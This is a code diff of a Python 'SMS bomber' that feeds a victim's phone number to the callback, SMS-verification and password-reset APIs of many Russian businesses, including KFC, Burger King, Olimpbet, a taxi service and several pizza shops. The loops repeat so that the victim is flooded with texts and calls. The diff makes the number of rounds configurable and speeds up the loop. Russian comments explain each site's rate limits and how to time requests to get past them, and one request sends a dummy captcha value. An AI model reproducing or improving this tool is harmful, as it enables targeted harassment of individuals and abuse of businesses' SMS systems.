@@ -12,7 +12,7 @@ def pizzalarenzo(phone):
     }
     response_pizzalarenzo = requests.post(url='https://pizzalarenzo.ru/api/callback.php',
                                           headers=headers)
-    print(response_pizzalarenzo)
+    print(response_pizzalarenzo, response_pizzalarenzo.content)
 
 def tarelochka(phone):
     headers = {
@@ -23,7 +23,7 @@ def tarelochka(phone):
     }
     response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php',
                                         headers=headers)
-    print(response_tarelochka)
+    print(response_tarelochka, response_tarelochka.content)
 
 def pizzapan(phone):
     headers = {
@@ -33,7 +33,7 @@ def pizzapan(phone):
     }
     response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php',
                                       headers=headers)
-    print(response_pizzapan)
+    print(response_pizzapan, response_pizzapan.content)
 
 
 def dostaevsky(phone):
@@ -43,7 +43,7 @@ def dostaevsky(phone):
     }
     response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php',
                                         headers=headers)
-    print(response_dostaevsky)
+    print(response_dostaevsky, response_dostaevsky.content)
 
 
 def pizzasushiwok(phone):
@@ -54,7 +54,7 @@ def pizzasushiwok(phone):
         'phone': '8'+phone
     }
     response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
-    print(response_pizzasushiwok)
+    print(response_pizzasushiwok, response_pizzasushiwok.content)
 
 
 def ipizza(phone):
@@ -65,7 +65,7 @@ def ipizza(phone):
         'phone': ipzzphn
     }
     response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
-    print(response_ipizza)
+    print(response_ipizza, response_ipizza.content)
 
 
 def okeansushi(phone):
@@ -76,14 +76,14 @@ def okeansushi(phone):
                                              '1%80%D0%B8%D0%B5%D0%B9&phone=' + oknsshphn +
                                              '&call_time=1&call_time_dt%5B%5D=21&call_time_dt%5B%5D'
                                              '=45&pravila2=on'))
-    print(response_okeansushi)
+    print(response_okeansushi, response_okeansushi.content)
 
 
 def sunlight(phone):
     snlghtphn = '7'+phone
     response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                       json={"phone": snlghtphn})
-    print(response_sunlight)
+    print(response_sunlight, response_sunlight.content)
 
 
 # тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
@@ -93,7 +93,7 @@ def bk(phone):
     response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
                                 json={"phone": bkphn,
                                       "g-recaptcha-response": "null"})
-    print(response_bk)
+    print(response_bk, response_bk.content)
 
 # ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
 def olimpbet(phone):
@@ -109,7 +109,7 @@ def olimpbet(phone):
     response_olimpbet = requests.post(url='https://www.olimp.bet/api/user/passrestore/',
                                       json={"lang_id": "0", "platforma": "SITE_CUPIS",
                                             "kind": "phone", "data": olmpphn})
-    print(response_olimpbet)
+    print(response_olimpbet, response_olimpbet.content)
 
 #  тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута,
 #  но оно как-то хз работает
@@ -118,7 +118,7 @@ def kfc(phone):
     response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                       'common/auth/send-validation-sms'),
                                  json={"phone": kfcphn})
-    print(response_kfc.content)
+    print(response_kfc, response_kfc.content)
 
 #  ваще без таймаута походу
 def taxinonstop(phone):
@@ -126,16 +126,13 @@ def taxinonstop(phone):
     response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                          json={"cmd": "register", "phone": txnnstpphn,
                                                "taxi_city": "tmn"})
-    print(response_taxinonstop)
+    print(response_taxinonstop, response_taxinonstop.content)
 
 def karusel(phone):
     krslphn = '7'+phone
     response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/', 
                                      json={"phone": krslphn})
-    print(response_karusel)
-    print(response_karusel.text)
-
-
+    print(response_karusel, response_karusel.content)
 
 def generate_email():
     """
@@ -181,20 +178,13 @@ def generate_email():
 #         taxinonstop(phone)
 #         sleep(180)
 
-def run (phone):
-    for i in range(5):
+def run(phone, n):
+    for i in range(n):
         kfc(phone)
         for j in range(3):
             bk(phone)
             karusel(phone)
-            for k in range(10):
+            for k in range(12):
                 sunlight(phone)
                 taxinonstop(phone)
-                sleep(6)
-            
-    
-        
-
-
-
-        
+                sleep(5)
